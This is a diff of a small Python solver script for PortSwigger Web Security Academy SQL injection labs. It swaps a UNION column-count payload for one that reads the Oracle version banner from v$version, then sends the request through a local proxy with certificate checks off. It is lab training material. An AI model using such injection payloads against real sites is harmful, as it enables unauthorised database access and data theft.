@@ -1,5 +1,5 @@
-# Lab name: Lab: SQL injection UNION attack, determining the number of columns returned by the query
-# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+# Lab name: Lab: SQL injection attack, querying the database type and version on Oracle
+# Lab link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
 
 import requests
 import urllib3
@@ -11,18 +11,16 @@ proxies = {
     'http':'http://127.0.0.1:8080',
     'https':'http://127.0.0.1:8080'
 }
-
-payload = "'union+select+null,null,null--"
+payload = "'union+select+null,banner+FROM+v$version--"
 
 def filter_url():
     global url
-    url = (url.split('.net', 1)[0]) + f'.net/filter?category=Lifestyle{payload}'
+    url = (url.split('.net', 1)[0]) + f'.net/filter?category={payload}'
 
 
 url = input('Enter lab url: ')
 
 filter_url()
-
 
 response = req.get(url, proxies=proxies, verify=False)
 
